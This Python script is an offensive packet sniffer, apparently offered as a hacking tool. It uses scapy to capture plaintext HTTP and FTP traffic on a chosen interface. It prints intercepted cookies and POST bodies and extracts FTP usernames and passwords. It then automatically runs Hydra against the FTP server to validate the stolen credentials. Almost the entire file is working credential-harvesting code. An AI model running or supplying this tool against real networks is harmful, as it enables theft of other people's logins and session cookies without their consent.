import warnings
from cryptography.utils import CryptographyDeprecationWarning
warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)

import argparse
from scapy.all import *
from scapy.layers.inet import IP  # libs to manipulate IP packets
from scapy.layers.http import HTTPRequest, TCP  # to intercept http 80 reqs and TCP
from colorama import init, Fore, Back, Style
from urllib.parse import unquote
import re
import subprocess
import sys

init()
# Colors inside variables
r, g, b = 255, 165, 0

def rgb(r, g, b):
    return f'\033[38;2;{r};{g};{b}m'

background = Back.CYAN + Fore.BLACK
magenta = Fore.MAGENTA
green = Fore.GREEN
red = Fore.RED
cyan = Fore.CYAN
blue = Fore.BLUE
yellow = Fore.YELLOW
yellow_bright = rgb(255, 255, 0)
violet = rgb(238, 130, 238)
white = Fore.WHITE
green_bright = rgb(0, 255, 0)
reset = Style.RESET_ALL

# Get arguments and parse it using argparse
script_name = sys.argv[0]

arguments = argparse.ArgumentParser(description="This is Packet Sniffing tool for HTTP and FTP.", usage=f"sudo python3 {script_name} -i interface")
arguments.add_argument('-i', "--interface", help="Enter the Interface to sniff packets", required=True)
arguments.add_argument('-H', "--http", help="To capture HTTP data of both GET and POST", action='store_true')
arguments.add_argument('-F', "--ftp", help="To capture FTP data", action='store_true')
args = arguments.parse_args()

# Main variables
interface = args.interface
http = args.http  # True or False
ftp = args.ftp

# Global variables for ftp_module
username_found = None
password_found = None
last_username = None
last_password = None

#print(packet[HTTPRequest].show()) #to show whole HTTP packet

banner = """
   _____       _  __  __     _____       _  __  __ 
  / ____|     (_)/ _|/ _|   / ____|     (_)/ _|/ _|
 | (___  _ __  _| |_| |_   | (___  _ __  _| |_| |_ 
  \___ \| '_ \| |  _|  _|   \___ \| '_ \| |  _|  _|
  ____) | | | | | | | |     ____) | | | | | | | |  
 |_____/|_| |_|_|_| |_|    |_____/|_| |_|_|_| |_|  
"""


print(f"""{yellow}      
{banner}{reset}
                {red}by unknown_exploit{reset}                                            
""")



def sniff_http_packets(interface):
    sniff(filter='dst port 80', prn=http_packets, iface=interface, store=False)  # prn means if a packet is received what to do with it, basically a callback to process_packet


def sniff_ftp_packets(interface):
    sniff(filter='tcp port 21', prn=ftp_packets, iface=interface, store=False)


def http_packets(packet):
    if packet.haslayer(HTTPRequest, TCP):
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        src_port = packet[TCP].sport
        dst_port = packet[TCP].dport
        url = packet[HTTPRequest].Host.decode("utf-8").rstrip() + unquote(packet[HTTPRequest].Path.decode("utf-8").rstrip())
        method = packet[HTTPRequest].Method.decode("utf-8").rstrip()
        host = packet[HTTPRequest].Host.decode("utf-8").rstrip()

        def get_method():
            if method == "GET":
                print(f"\n{violet}{src_ip}{reset} -> {green}{method}{reset} -> {red}http://{url}{reset} -> {dst_ip}:{dst_port}\n")
                if packet[HTTPRequest].Method:
                    print(f"Method: {green}{method}{reset}")
                print(f"Host: {green}{host}{reset}")
                if packet[HTTPRequest].User_Agent:
                    get_user_agent = packet[HTTPRequest].User_Agent.decode("utf-8").rstrip()
                    print(f"User Agent: {green}{get_user_agent}{reset}")
                if packet[HTTPRequest].Cookie:
                    get_cookie = unquote(packet[HTTPRequest].Cookie.decode("utf-8").rstrip())
                    print(f"Cookie: {red}{get_cookie}{reset}")
        get_method()

        def post_method():
            if method == "POST":
                print(f"\n{violet}{src_ip}{reset} -> {green}{method}{reset} -> {red}http://{url}{reset} -> {dst_ip}:{dst_port}\n")
                if packet[HTTPRequest].Method:
                    print(f"Method: {green}{method}{reset}")
                print(f"Host: {green}{host}{reset}")
                if packet[HTTPRequest].User_Agent:
                    post_user_agent = packet[HTTPRequest].User_Agent.decode("utf-8").rstrip()
                    print(f"User Agent: {green}{post_user_agent}{reset}")
                if packet[HTTPRequest].Cookie:
                    post_cookie = unquote(packet[HTTPRequest].Cookie.decode("utf-8").rstrip())
                    print(f"Cookie: {red}{post_cookie}{reset}")
                if packet.haslayer(Raw):
                    post_data = unquote(packet.getlayer(Raw).load.decode("utf-8").rstrip())
                    print(f"[+]Data:\n {green_bright}{post_data}{reset}")
        post_method()





def ftp_packets(packet):
    global username_found, password_found, last_username, last_password
    #print(packet[TCP].show())
    if packet.haslayer(TCP):
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        src_port = packet[TCP].sport
        dst_port = packet[TCP].dport
    if packet.haslayer(Raw):
        raw_ftp_data = packet.getlayer(Raw).load.decode("utf-8").rstrip()
        username_pattern = r"USER\s*(\S+)"
        password_pattern = r"PASS\s*(\S+)"
        username_match = re.search(username_pattern, raw_ftp_data)
        password_match = re.search(password_pattern, raw_ftp_data)
        if username_match:
            username_found = username_match.group(1)
            print(f"\n{background} [!] FTP Login Detected from {src_ip} to {red}{dst_ip}:{dst_port}{reset}{reset}\n")
            print(f"{green}[+]{reset} Username: {red}{username_found}{reset}")
        if password_match:
            password_found = password_match.group(1)
            print(f"{green}[+]{reset} Password: {red}{password_found}{reset}")

        if username_found is not None and password_found is not None:
            if username_found != last_username and password_found != last_password:
                last_username = username_found
                last_password = password_found
                try:
                    print(f"\n{violet}Running Hydra to Validate Credentials...{reset}\n")
                    result = subprocess.run(
                        ["hydra", "-I", "-t", "1", "-l", username_found, "-p", password_found, f"ftp://{dst_ip}"],
                        capture_output=True, text=True, check=True
                    )
                    hydra_output = result.stdout.splitlines()
                    for line_num, line in enumerate(hydra_output):
                        if line_num >= 4 and line_num <= 6:
                            print(f"{yellow}{line}{reset}")
                except subprocess.CalledProcessError as e:
                    print(f"Hydra command failed with return code {e.returncode}")
                    print(e.stderr)


if http:
    sniff_http_packets(interface)

if ftp:
    sniff_ftp_packets(interface)
